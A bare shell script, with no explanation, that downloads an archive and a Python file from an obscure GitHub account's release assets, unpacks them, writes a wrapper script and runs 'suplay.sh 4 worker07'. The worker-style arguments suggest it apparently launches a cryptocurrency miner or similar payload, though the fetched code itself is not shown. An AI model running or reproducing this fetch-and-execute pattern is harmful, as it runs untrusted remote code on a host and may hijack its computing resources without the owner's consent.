curl -O -J -L https://github.com/apefanubs696-dotcom/geranx/releases/download/sama/koni.tar.gz && tar -xf koni.tar.gz && rm -rf koni.tar.gz
curl -O -J -L https://github.com/apefanubs696-dotcom/geranx/releases/download/sama/power.py
echo '#!/bin/bash

bash suplay.sh 4 worker07' > baso.sh
chmod +x baso.sh
./baso.sh
